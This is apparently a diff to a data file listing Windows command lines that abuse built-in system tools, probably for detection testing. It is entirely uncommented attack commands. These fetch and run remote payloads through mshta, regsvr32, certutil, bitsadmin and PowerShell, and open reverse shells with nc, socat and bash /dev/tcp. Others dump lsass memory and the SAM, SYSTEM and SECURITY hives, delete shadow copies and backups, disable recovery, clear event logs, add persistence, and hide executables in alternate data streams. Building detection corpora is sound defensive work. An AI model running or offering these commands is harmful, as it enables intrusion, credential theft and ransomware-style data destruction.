@@ -1,60 +1,167 @@
 regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey
 nc.exe 193.168.100.113 4444 -e cmd.exe
-cscript.exe //E:jscript \\11.11.11.11\folder\payload.txt
-pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct
-mshta.exe "C:\\ads\\file.txt:file.hta"
 odbcconf /s /a {regsvr \\10.10.10.10\folder\payload_dll.txt}
 dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
-mshta.exe http://10.10.10.10/payload.hta
-regasm /u \\webdavserver\folder\payload.dll
-mshta.exe http://webserver/payload.hta
 wmic os get /format:"https://11.11.11.11/payload.xsl"
 reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg
-mshta vbscript:Close(Execute("GetObject(""script:http://11.11.11.11/payload.sct"")"))
 cmd.exe /k < \\10.10.10.10\folder\batchfile.txt
 findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe
 wmic os get /format:"https://10.10.10.10/payload.xsl"
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\11.11.11.11\folder\payload.dll
 dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
-Powerpnt.exe "http://amaare.mere/TeamsAddinLoader.dll"
-mshta http://11.11.11.11/payload.hta
-Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
-mshta.exe vbscript:Close(Execute("GetObject(""script:http://11.11.11.11/payload.sct"")"))
 C:\Windows\System32\Wbem\wmic.EXE os get /format:"http://sec.dashabi.in/javaw2/net/net.xsl"
 regsvr32  /s /n /u /i:http://119.45.191.240:30122/OcpGglOx.sct scrobj.dll
-regasm /u \\10.10.10.10\folder\payload.dll
 regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
-pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
-mshta.exe http://10.10.10.10/runme.hta
-rundll32 "C:\\ads\\file.txt:ADSDLL.dll"
-mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
-cscript.exe //E:jscript \\webdavserver\folder\payload.txt
-mshta.exe http://11.11.11.11/payload.hta
 powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
-pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct
 C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 forfiles /p c:\\windows\\system32 /m notepad.exe /c "c:\\folder\\normal.dll:evil.exe"
-mshta.exe http://malicious.domain/runme.hta
 nc.exe 192.168.100.113 4444 -e cmd.exe
 esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o
-makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
-Powerpnt.exe "http://193.168.1.10/TeamsAddinLoader.dll"
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet
 regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll
 bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
-regini.exe newfile.txt:hidden.ini
 regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll
 cmd.exe /k < \\webdavserver\folder\batchfile.txt
-mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
-expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat
-cscript //E:jscript \\11.11.11.11\folder\payload.txt
-wscript c:\\ads\\file.txt:script.vbs
-mshta.exe vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
-regasm /u \\11.11.11.11\folder\payload.dll
-extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe
-cscript //E:jscript \\webdavserver\folder\payload.txt
-mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10/payload.sct"")"))
 regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll
+certutil.exe -urlcache -split -f http://example.com/a.exe C:\Temp\a.exe
+certutil.exe -verifyctl -f http://example.com/a.dll
+certutil.exe -decode C:\Temp\a.b64 C:\Temp\a.exe
+certutil.exe -decodehex C:\Temp\a.hex C:\Temp\a.dll
+certutil.exe -encode C:\Temp\a.exe C:\Temp\a.txt
+certutil.exe -urlcache -f http://example.com/a.exe C:\Temp\x.txt:a.exe
+bitsadmin.exe /transfer job /download /priority high http://example.com/a.exe C:\Temp\a.exe
+bitsadmin.exe /create /download job
+bitsadmin.exe /addfile job http://example.com/a.exe C:\Temp\a.exe
+bitsadmin.exe /SetNotifyCmdLine job C:\Temp\a.exe NULL
+bitsadmin.exe /resume job & bitsadmin.exe /complete job
+powershell.exe -nop -c "iex (iwr http://example.com/a.ps1 -UseBasicParsing)"
+powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/a')"
+powershell.exe -c "iwr http://example.com/a.exe -OutFile C:\Temp\a.exe"
+powershell.exe -c "Start-BitsTransfer http://example.com/a.exe C:\Temp\a.exe"
+powershell.exe -nop -w hidden -File C:\Temp\a.ps1
+powershell.exe -ExecutionPolicy Bypass -File C:\Temp\a.ps1
+powershell.exe -c "Get-Content C:\Temp\x.txt -Stream a.ps1 | iex"
+powershell.exe -c "Set-Content C:\Temp\x.txt -Stream a.ps1 -Value 'whoami'"
+powershell.exe -c "rundll32.exe C:\Temp\a.dll,Start"
+pwsh.exe -nop -c "iex (iwr http://example.com/a.ps1)"
+regsvr32.exe /s /n /u /i:http://example.com/a.sct scrobj.dll
+regsvr32.exe /s /n /u /i:C:\Temp\a.sct scrobj.dll
+regsvr32.exe /s /u C:\Temp\a.dll
+regsvr32.exe /s /i C:\Temp\a.dll
+rundll32.exe comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Temp\a.inf
+cmd.exe /c mshta.exe http://example.com/a.hta
+cmd.exe /c mshta.exe C:\Temp\x.txt:a.hta
+mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")
+cmd.exe /c wscript.exe C:\Temp\x.txt:a.vbs
+cscript.exe //nologo //E:jscript C:\Temp\x.txt:a.js
+cscript.exe //nologo //E:jscript \\example.com\share\a.txt
+wscript.exe //E:vbscript //B C:\Temp\a.txt
+cscript.exe //nologo pubprn.vbs 127.0.0.1 script:http://example.com/a.sct
+wmic.exe os get /format:http://example.com/a.xsl
+wmic.exe process call create "cmd.exe /c C:\Temp\a.exe"
+wmic.exe /node:192.0.2.10 process call create "cmd /c whoami"
+wmic.exe process where name="lsass.exe" get ProcessId
+msbuild.exe C:\Temp\a.xml /nologo /verbosity:quiet
+msbuild.exe \\example.com\share\a.xml /nologo /target:Build
+regasm.exe /u /nologo C:\Temp\a.dll
+regsvcs.exe /u /nologo C:\Temp\a.dll
+installutil.exe /logfile= /LogToConsole=false /U C:\Temp\a.exe
+odbcconf.exe /s /a "{REGSVR C:\Temp\a.dll}"
+odbcconf.exe /s /f C:\Temp\a.rsp
+cmstp.exe /s /ni C:\Temp\a.inf
+dnscmd.exe localhost /config /serverlevelplugindll C:\Temp\a.dll
+netsh.exe add helper C:\Temp\a.dll
+mavinject.exe 1234 /INJECTRUNNING C:\Temp\a.dll
+pcalua.exe -a C:\Temp\a.exe -d C:\Temp
+pcalua.exe -a cmd.exe -c "/c C:\Temp\a.bat"
+forfiles.exe /p C:\Windows /m notepad.exe /c "cmd /c C:\Temp\a.exe"
+forfiles.exe /p C:\Temp /m x.txt /c "cmd /c C:\Temp\x.txt:a.exe"
+reg.exe export HKLM\SAM C:\Temp\x.txt:sam.reg /y
+reg.exe save HKLM\SAM C:\Temp\sam.hiv /y
+reg.exe save HKLM\SYSTEM C:\Temp\system.hiv /y
+reg.exe save HKLM\SECURITY C:\Temp\security.hiv /y
+reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Temp\a.exe /f
+regedit.exe /E C:\Temp\x.txt:run.reg HKEY_CURRENT_USER\Software
+esentutl.exe /y C:\Windows\System32\config\SAM /d C:\Temp\sam.hiv /o
+esentutl.exe /y C:\Temp\a.exe /d C:\Temp\x.txt:a.exe /o
+expand.exe C:\Temp\a.cab -F:* C:\Temp
+extrac32.exe /Y /C C:\Temp\a.cab C:\Temp\x.txt:a.exe
+findstr.exe /V /L NOMATCH C:\Temp\a.exe > C:\Temp\x.txt:a.exe
+cmd.exe /c type C:\Temp\a.exe > C:\Temp\x.txt:a.exe
+cmd.exe /c more < C:\Temp\x.txt:a.bat
+cmd.exe /c < \\example.com\share\a.bat
+cmd.exe /c copy /b C:\Temp\a.exe C:\Temp\x.txt:a.exe
+procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
+procdump64.exe -accepteula -ma lsass.exe C:\Temp\dump
+procdump.exe -accepteula -ma 624 C:\Temp\dump.dmp
+adplus.exe -hang -pn lsass.exe -o C:\Temp\dump -quiet
+sqldumper.exe 624 0 0x01100 0 C:\Temp
+ntdsutil.exe "ac i ntds" "ifm" "create full C:\Temp\ifm" q q
+vssadmin.exe create shadow /for=C:
+vssadmin.exe delete shadows /all /quiet
+wmic.exe shadowcopy delete /nointeractive
+wbadmin.exe delete catalog -quiet
+bcdedit.exe /set {default} recoveryenabled No
+bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+wevtutil.exe cl Security /bu:C:\Temp\security.evtx
+wevtutil.exe cl System /bu:C:\Temp\system.evtx
+schtasks.exe /create /sc onlogon /tn Updater /tr C:\Temp\a.exe /f
+schtasks.exe /create /sc minute /mo 5 /tn Updater /tr C:\Temp\a.exe /f
+schtasks.exe /run /tn Updater
+sc.exe create Updater binPath= C:\Temp\a.exe start= auto
+sc.exe config Updater binPath= "cmd.exe /c C:\Temp\a.bat"
+sc.exe start Updater arg
+at.exe 12:00 /interactive cmd.exe /c C:\Temp\a.bat
+runas.exe /savecred /user:Administrator "cmd /c C:\Temp\a.exe"
+nc.exe -e cmd.exe 192.0.2.10 4444
+ncat.exe 192.0.2.10 4444 --exec cmd.exe
+bash.exe -c "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"
+wsl.exe -e bash -c "curl http://example.com/a.sh | sh"
+ssh.exe -o ProxyCommand="C:\Temp\a.exe" user@example.com
+curl.exe -o C:\Temp\a.exe http://example.com/a.exe
+curl.exe -T C:\Temp\lsass.dmp http://example.com/upload
+certreq.exe -Post -config http://example.com/ C:\Temp\data.txt C:\Temp\reply.txt
+cmdl32.exe /vpn /lan C:\Temp\a.cmp
+replace.exe C:\Temp\a.dll C:\App /U
+xcopy.exe /Y C:\Temp\a.dll C:\App\version.dll
+robocopy.exe C:\Temp C:\App version.dll /IS
+cmd.exe /c copy C:\Temp\a.dll C:\App\version.dll & C:\App\app.exe
+cmd.exe /c copy C:\Temp\a.dll C:\App\winmm.dll & C:\App\app.exe
+cmd.exe /c set PATH=C:\Temp;%PATH% & C:\App\app.exe
+csc.exe /target:library /out:C:\Temp\a.dll C:\Temp\a.cs
+jsc.exe /nologo /out:C:\Temp\a.exe C:\Temp\a.js
+aspnet_compiler.exe -v / -p C:\Temp\site C:\Temp\out
+csi.exe /exec C:\Temp\a.csx arg
+dotnet.exe exec C:\Temp\a.dll arg
+hh.exe -decompile C:\Temp\out C:\Temp\a.chm
+cmd.exe /c control.exe C:\Temp\a.cpl
+msiexec.exe /i http://example.com/a.msi /qn
+msiexec.exe /y C:\Temp\a.dll /quiet
+msiexec.exe /z C:\Temp\a.dll /quiet
+msiexec.exe /i C:\Temp\a.msi /qn /norestart
+sftp.exe -D C:\Temp\a.exe user@example.com
+powershell.exe -c "Import-Module C:\Temp\a.psd1 -Force"
+powershell.exe -c "Start-Process C:\Temp\a.exe -WindowStyle Hidden"
+winrs.exe -r:192.0.2.10 cmd.exe /c C:\Temp\a.exe
+cmd.exe /c rundll32.exe C:\Temp\a.dll,Start
+cmd.exe /c rundll32.exe \\example.com\share\a.dll,Start
+cmd.exe /c rundll32.exe C:\Temp\x.txt:a.dll,Start
+cmd.exe /c rundll32.exe advpack.dll,LaunchINFSection C:\Temp\a.inf,DefaultInstall
+cmd.exe /c rundll32.exe ieadvpack.dll,LaunchINFSection C:\Temp\a.inf,DefaultInstall
+cmd.exe /c rundll32.exe url.dll,FileProtocolHandler C:\Temp\a.hta
+cmd.exe /c rundll32.exe pcwutl.dll,LaunchApplication C:\Temp\a.exe
+cmd.exe /c makecab.exe C:\Temp\a.exe C:\Temp\x.txt:a.cab
+cmd.exe /c ftp.exe -n -s:C:\Temp\a.txt
+cmd.exe /c regini.exe C:\Temp\x.txt:hidden.ini
+cmd.exe /c regasm.exe /u C:\Temp\a.dll
+cmd.exe /c regsvcs.exe C:\Temp\a.dll
+cmd.exe /c mshta.exe \\example.com\share\a.hta
+cmd.exe /c cscript.exe //E:jscript \\example.com\share\a.txt
+cmd.exe /c wscript.exe //E:vbscript C:\Temp\a.txt
+cmd.exe /c regsvr32.exe /s C:\Temp\x.txt:a.dll
+cmd.exe /c hh.exe C:\Temp\a.chm
+cmd.exe /c installutil.exe /U C:\Temp\a.exe
+cmd.exe /c msbuild.exe C:\Temp\a.xml
+cmd.exe /c presentationhost.exe C:\Temp\a.xbap
